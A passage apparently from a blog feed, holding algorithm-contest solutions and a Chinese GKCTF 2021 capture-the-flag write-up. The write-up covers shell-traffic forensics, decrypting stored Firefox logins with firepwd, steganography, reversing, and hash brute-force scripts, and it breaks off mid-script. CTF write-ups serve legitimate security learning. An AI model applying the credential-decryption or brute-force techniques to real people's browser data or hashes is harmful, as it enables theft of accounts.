class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d %d %d %d %d\n&quot;</span>, i - <span class="hljs-number">1</span>, j, i, j, i, j + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    cin &gt;&gt; T;<br>    <span class="hljs-keyword">while</span> (T -- )<br>    &#123;<br>        cin &gt;&gt; n &gt;&gt; m;<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        &#123;<br>            cin &gt;&gt; g[i] + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j ++ )<br>                <span class="hljs-keyword">if</span> (g[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>)<br>                    res += <span class="hljs-number">3</span>;<br>        &#125;<br>        cout &lt;&lt; res &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j ++ )<br>                <span class="hljs-keyword">if</span> (g[i][j] == <span class="hljs-string">&#x27;1&#x27;</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (i &lt; n &amp;&amp; j &lt; m)<br>                        <span class="hljs-built_in">pL</span>(i, j, <span class="hljs-number">0</span>), <span class="hljs-built_in">pL</span>(i, j + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-built_in">pL</span>(i + <span class="hljs-number">1</span>, j, <span class="hljs-number">3</span>);<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == n &amp;&amp; j == m)<br>                        <span class="hljs-built_in">pL</span>(i, j, <span class="hljs-number">2</span>), <span class="hljs-built_in">pL</span>(i - <span class="hljs-number">1</span>, j, <span class="hljs-number">1</span>), <span class="hljs-built_in">pL</span>(i, j - <span class="hljs-number">1</span>, <span class="hljs-number">3</span>);<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == n)<br>                        <span class="hljs-built_in">pL</span>(i, j, <span class="hljs-number">3</span>), <span class="hljs-built_in">pL</span>(i - <span class="hljs-number">1</span>, j, <span class="hljs-number">0</span>), <span class="hljs-built_in">pL</span>(i, j + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>                    <span class="hljs-keyword">else</span><br>                        <span class="hljs-built_in">pL</span>(i, j, <span class="hljs-number">1</span>), <span class="hljs-built_in">pL</span>(i, j - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-built_in">pL</span>(i + <span class="hljs-number">1</span>, j, <span class="hljs-number">2</span>);<br>                &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3767-最小的值-AcWing题库"><a href="#3767-最小的值-AcWing题库" class="headerlink" title="3767. 最小的值 - AcWing题库"></a><a href="https://www.acwing.com/problem/content/3770/">3767. 最小的值 - AcWing题库</a></h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>贪心</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> a[N], b[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)    cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)    cin&gt;&gt;b[i];<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0</span>, y=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        <span class="hljs-keyword">if</span>(a[i]&lt;b[i])   x++;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a[i] &gt; b[i])    y++;<br>    <span class="hljs-keyword">if</span>(!y)  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-1&quot;</span>);<br>    <span class="hljs-keyword">else</span> cout&lt;&lt;(x+y)/y&lt;&lt;endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF X DASCTF应急挑战杯-Maple_root-Writeup</title>
      <link href="/2021/06/748fffcf.html"/>
      <url>/2021/06/748fffcf.html</url>
      
        <content type="html"><![CDATA[<h1 id="GKCTF-X-DASCTF应急挑战杯-Maple-root-Writeup"><a href="#GKCTF-X-DASCTF应急挑战杯-Maple-root-Writeup" class="headerlink" title="GKCTF X DASCTF应急挑战杯-Maple_root-Writeup"></a>GKCTF X DASCTF应急挑战杯-Maple_root-Writeup</h1><blockquote><p>参赛队员：</p><p>b4tteRy, x0r, f1oat</p><p>最终成绩：2285</p><p>最终排名：27</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过最近几次类线下的演练，感觉慢慢对CTF有点上手了，这次终于不再爆0了，继续努力</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>wireshark打开可知是shell流量，命令结果编码为hex+base64。观察前面几条<code>whoami/ls</code>等命令输出可知每行输出都是倒序输出。<br><img src="https://i.loli.net/2021/06/26/JMDrjQyf2hPFqY6.png" alt="QQ截图20210626094803.png"><br>故将<code>cat /f14g|base64</code>的结果每行倒序拼接解码后得到flag的编辑记录，去除双写得到flag。<br><img src="https://i.loli.net/2021/06/26/d15HirpkKluDP4g.png" alt="QQ截图20210626094720.png"></p><h3 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h3><p>将apng转换为gif后查看，发现部分关键帧内有二维码。<br><img src="https://i.loli.net/2021/06/26/4QvgFLoeuVM8pmA.png" alt="1.png"><br><img src="https://i.loli.net/2021/06/26/NcEbfTJ1vZraliM.png" alt="9.png"><br><img src="https://i.loli.net/2021/06/26/OqDQ8PYUgCankwM.png" alt="笑死 这不画一遍能扫出来?.png"><br><img src="https://i.loli.net/2021/06/26/rR4dNcUg67Y2eCn.png" alt="17.png"><br><img src="https://i.loli.net/2021/06/26/P7EM6GqNBdCcQzL.png" alt="25.png"></p><p>扫描结果顺序拼接得到flag。    </p><h3 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h3><p><img src="https://i.loli.net/2021/06/26/oqalyunJPd5fzLF.png" alt="1.png"><br><img src="https://i.loli.net/2021/06/26/zyqbjAewWE68c13.png" alt="2.png"><br><img src="https://i.loli.net/2021/06/26/JgD8zVtZAbC3uOX.png" alt="3.png"><br><img src="https://i.loli.net/2021/06/26/LgodRwXaC46JTy5.png" alt="4.png"></p><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><p>下载下来解压以后有一个json文件和一个sql存储的db数据库文件，查看db数据库内容是加密的，又根据题目提示本题内容属于登录信息相关，应该是FireFox浏览器所存储的登录信息，在Github上已有相关的<a href="https://github.com/lclevy/firepwd">解密脚本</a>，直接下载以后将题目给出的两个文件放入相同目录，使用<code>python3 firepwd.py</code>即可成功解密得到flag</p><h3 id="excel骚操作"><a href="#excel骚操作" class="headerlink" title="excel骚操作"></a>excel骚操作</h3><p>打开看到一行字，根据提示flag隐写在表格中。<br>依次查看单元格&#x2F;解压查看数据可发现部分单元格值为1，查看单元格格式可发现格式为;;;，改变格式后正常显示出数字。<br>设置条件格式，使得所有值为1的单元格黑色填充，并拉伸所有数字范围内单元格至正方形，得到黑色单元格画成的汉信码。<br><img src="https://i.loli.net/2021/06/26/2VSJyv1OAskhuqg.png" alt="CG9LJ__0_BL2Q_NX6RISWG.png"><br>使用中国编码app扫描得到flag。    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><p>下载后使用PEID扫描是WIN32程序，拖入IDA32分析可看出程序显然是由Qt语言所编写，题目名称也印证了这一点，一开始在IDA的WinMain窗口中多次依照逻辑查找无果，之后又在OD中尝试进行动态调试，在分析出的字符串当中找到了flag相关的关键词已经其上下的文本地址<img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_99065f2d2481455b9da7a78f43a084dc.png"></p><p><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_227455fa3fe3a2c45fb625225af83565.png"><br>然后在IDA中根据以上地址找到这些字符串所在的位置，可以得到如下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __thiscall <span class="hljs-title function_">sub_4012F0</span><span class="hljs-params">(_DWORD *this)</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// edi</span><br>  _BYTE *v2; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// edx</span><br>  _BYTE *v4; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// esi</span><br>  _BYTE *v11; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v12; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp-8h] [ebp-A8h]</span><br>  <span class="hljs-type">char</span> v16[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+10h] [ebp-90h] BYREF</span><br>  <span class="hljs-type">char</span> v17[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+14h] [ebp-8Ch] BYREF</span><br>  _BYTE *v18; <span class="hljs-comment">// [esp+18h] [ebp-88h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v19; <span class="hljs-comment">// [esp+1Ch] [ebp-84h]</span><br>  <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp+20h] [ebp-80h]</span><br>  <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp+24h] [ebp-7Ch] BYREF</span><br>  _BYTE *v22; <span class="hljs-comment">// [esp+28h] [ebp-78h] BYREF</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">60</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-74h] BYREF</span><br>  __int128 v24[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+68h] [ebp-38h] BYREF</span><br>  __int64 v25; <span class="hljs-comment">// [esp+88h] [ebp-18h]</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp+9Ch] [ebp-4h]</span><br><br>  MEMORY[<span class="hljs-number">0x5FF6</span>](*(_DWORD *)(this[<span class="hljs-number">6</span>] + <span class="hljs-number">4</span>), v16);<br>  v26 = <span class="hljs-number">0</span>;<br>  MEMORY[<span class="hljs-number">0x7C7C</span>](v16, v17);<br>  LOBYTE(v26) = <span class="hljs-number">1</span>;<br>  v19 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)MEMORY[<span class="hljs-number">0x7C48</span>](v17);<br>  v24[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>i64;<br>  v24[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>i64;<br>  v25 = <span class="hljs-number">0</span>i64;<br>  <span class="hljs-built_in">strcpy</span>(v23, <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);<br>  v21 = <span class="hljs-number">138</span> * <span class="hljs-built_in">strlen</span>(v19) / <span class="hljs-number">0x64</span>;<br>  v14 = v21 + <span class="hljs-number">1</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  v22 = (_BYTE *)MEMORY[<span class="hljs-number">0x8114</span>](v21 + <span class="hljs-number">1</span>);<br>  v2 = v22;<br>  sub_402C08(v22, <span class="hljs-number">0</span>, v14);<br>  v3 = v19;<br>  v20 = (<span class="hljs-type">int</span>)(v19 + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v19) )<br>  &#123;<br>    v4 = &amp;v2[v21];<br>    v18 = v4;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v20 = ((<span class="hljs-type">char</span>)*v4 &lt;&lt; <span class="hljs-number">8</span>) + v3[v1];<br>      v5 = v20 / <span class="hljs-number">58</span>;<br>      *v4 = v20 % <span class="hljs-number">58</span>;<br>      <span class="hljs-keyword">if</span> ( v5 )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v6 = (<span class="hljs-type">char</span>)*--v4;<br>          v7 = (v6 &lt;&lt; <span class="hljs-number">8</span>) + v5;<br>          v20 = v7 / <span class="hljs-number">58</span>;<br>          *v4 = v7 % <span class="hljs-number">58</span>;<br>          v5 = v20;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v20 );<br>        v4 = v18;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( ++v1 &gt;= <span class="hljs-built_in">strlen</span>(v19) )<br>        <span class="hljs-keyword">break</span>;<br>      v3 = v19;<br>    &#125;<br>    v2 = v22;<br>  &#125;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( !*v2 )<br>  &#123;<br>    <span class="hljs-keyword">do</span><br>      ++v8;<br>    <span class="hljs-keyword">while</span> ( !v2[v8] );<br>  &#125;<br>  v9 = v21;<br>  <span class="hljs-keyword">if</span> ( v8 &lt;= v21 )<br>  &#123;<br>    v10 = v2 - (_BYTE *)v24;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v11 = (<span class="hljs-type">char</span> *)v24 + v8++;<br>      *v11 = v23[(<span class="hljs-type">char</span>)v11[v10]];<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v8 &lt;= v9 );<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !MEMORY[<span class="hljs-number">0x7C1A</span>](v24, <span class="hljs-string">&quot;56fkoP8KhwCf3v7CEz&quot;</span>) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v19 )<br>      v12 = <span class="hljs-built_in">strlen</span>(v19);<br>    <span class="hljs-keyword">else</span><br>      v12 = <span class="hljs-number">-1</span>;<br>    v22 = (_BYTE *)MEMORY[<span class="hljs-number">0x7CCC</span>](v19, v12);<br>    LOBYTE(v26) = <span class="hljs-number">2</span>;<br>    v21 = MEMORY[<span class="hljs-number">0x7CCC</span>](<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">4</span>);<br>    LOBYTE(v26) = <span class="hljs-number">3</span>;<br>    MEMORY[<span class="hljs-number">0x6124</span>](this, &amp;v21, &amp;v22, <span class="hljs-number">1024</span>, <span class="hljs-number">0</span>);<br>    MEMORY[<span class="hljs-number">0x7C66</span>](&amp;v21);<br>    MEMORY[<span class="hljs-number">0x7C66</span>](&amp;v22);<br>  &#125;<br>  MEMORY[<span class="hljs-number">0x7C30</span>](v17);<br>  <span class="hljs-keyword">return</span> MEMORY[<span class="hljs-number">0x7C66</span>]();<br>&#125;<br></code></pre></td></tr></table></figure><p>由上方字符串<code>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</code>推测为Base58编码，将字符串<code>56fkoP8KhwCf3v7CEz</code>以Base58解码后尝试提交即为flag</p><h3 id="Crash"><a href="#Crash" class="headerlink" title="Crash"></a>Crash</h3><p>打开发现本程序是用Golang编写的，因此使用IDA7.6打开即可对应大部分的字符集，打开main_main看第18行为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1[<span class="hljs-number">1</span>] == <span class="hljs-number">43LL</span> &amp;&amp; *(_DWORD *)v0 == <span class="hljs-number">1413696327</span> &amp;&amp; *(_WORD *)(v0 + <span class="hljs-number">4</span>) == <span class="hljs-number">31558</span> &amp;&amp; *(_BYTE *)(v0 + <span class="hljs-number">42</span>) == <span class="hljs-number">125</span> )<br></code></pre></td></tr></table></figure><p>其中，各个等值式分别判定了<code>TCKG</code>(内存地址中倒序存储字符串),<code>&#123;F</code>,<code>&#125;</code>，因此推断这里应该就是在进行flag的判定，接着进入main_check函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __golang <span class="hljs-title function_">main_check</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-68h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-68h]</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+10h] [rbp-68h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+18h] [rbp-60h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v13; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v14; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v15; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v16; <span class="hljs-comment">// [rsp+20h] [rbp-58h]</span><br>  __int64 v17; <span class="hljs-comment">// [rsp+28h] [rbp-50h]</span><br>  __int64 v18; <span class="hljs-comment">// [rsp+28h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v19[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">char</span> v20[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-28h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( a2 &lt; <span class="hljs-number">0x1E</span> )<br>    runtime_panicSliceAlen();<br>  v2 = main_encrypto(a1 + <span class="hljs-number">6</span>, <span class="hljs-number">24LL</span>);<br>  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">44</span> )<br>  &#123;<br>    v11 = runtime_memequal(v2, (__int64)<span class="hljs-string">&quot;o/aWPjNNxMPZDnJlNp0zK5+NLPC4Tv6kqdJqjkL0XkA=&quot;</span>, <span class="hljs-number">44LL</span>, <span class="hljs-number">44</span>);<br>    <span class="hljs-keyword">if</span> ( (_BYTE)v5 )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( a2 &lt; <span class="hljs-number">0x22</span> )<br>        runtime_panicSliceAlen();<br>      v17 = runtime_stringtoslicebyte((__int64)v19, a1 + <span class="hljs-number">30</span>, <span class="hljs-number">4LL</span>, v5, v11);<br>      Encrypt_HashHex2(v6, v12, v17, v6, v12);<br>      <span class="hljs-keyword">if</span> ( v13 == <span class="hljs-number">64</span> )<br>      &#123;<br>        v14 = runtime_memequal(<br>                v7,<br>                (__int64)<span class="hljs-string">&quot;6e2b55c78937d63490b4b26ab3ac3cb54df4c5ca7d60012c13d2d1234a732b74&quot;</span>,<br>                <span class="hljs-number">64LL</span>,<br>                v7);<br>        <span class="hljs-keyword">if</span> ( (_BYTE)v7 )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( a2 &lt; <span class="hljs-number">0x26</span> )<br>            runtime_panicSliceAlen();<br>          v18 = runtime_stringtoslicebyte((__int64)v20, a1 + <span class="hljs-number">34</span>, <span class="hljs-number">4LL</span>, v7, v14);<br>          Encrypt_HashHex5(v8, v15, v18, v8, v15);<br>          <span class="hljs-keyword">if</span> ( v16 == <span class="hljs-number">128</span> )<br>          &#123;<br>            runtime_memequal(<br>              v9,<br>              (__int64)<span class="hljs-string">&quot;6500fe72abcab63d87f213d2218b0ee086a1828188439ca485a1a40968fd272865d5ca4d5ef5a651270a52ff952d955c9&quot;</span><br>                       <span class="hljs-string">&quot;b757caae1ecce804582ae78f87fa3c9&quot;</span>,<br>              <span class="hljs-number">128LL</span>,<br>              v9);<br>            <span class="hljs-keyword">if</span> ( (_BYTE)v9 )<br>            &#123;<br>              <span class="hljs-keyword">if</span> ( a2 &lt; <span class="hljs-number">0x2A</span> )<br>                runtime_panicSliceAlen();<br>              main_hash(a1 + <span class="hljs-number">38</span>, <span class="hljs-number">4LL</span>, v3, v9);<br>              <span class="hljs-keyword">if</span> ( v10 == <span class="hljs-number">32</span> )<br>                runtime_memequal(v4, (__int64)<span class="hljs-string">&quot;ff6e2fd78aca4736037258f0ede4ecf0&quot;</span>, <span class="hljs-number">32LL</span>, <span class="hljs-number">32</span>);<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，总共分为了若干段，第一段有六个字符，且使用了DES加密（可直接爆破）第二段是使用了sha256加密，第三段是使用了sha512加密，最后一段则使用了md5加密，以上若干加密段皆可根据前面所截取提交内容内的长度推断该段加密前明文的长度，因此除第一个DES爆破解密已有相关网站外，其余皆写相同脚本爆破即可<br>第一段DES加密可以从<code>encoding_json_Unmarshal</code>内找到key和iv</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;WelcomeToTheGKCTF2021XXX&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;iv&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1Ssecret&quot;</span><br></code></pre></td></tr></table></figure><p>接着发现此处key共有24byte，因此推测为3des，因此进行相应的爆破即可得到第一段flag，后面几段的解题脚本如下：<br>sha256 -&gt; 4位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>dateset = string.ascii_lowercase + string.digits<br><br>res = <span class="hljs-string">&quot;6e2b55c78937d63490b4b26ab3ac3cb54df4c5ca7d60012c13d2d1234a732b74&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_strings</span>(<span class="hljs-params">length=<span class="hljs-number">4</span></span>):<br>    chars = string.ascii_lowercase + string.digits<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> itertools.product(chars, repeat=length):<br>        tmp = <span 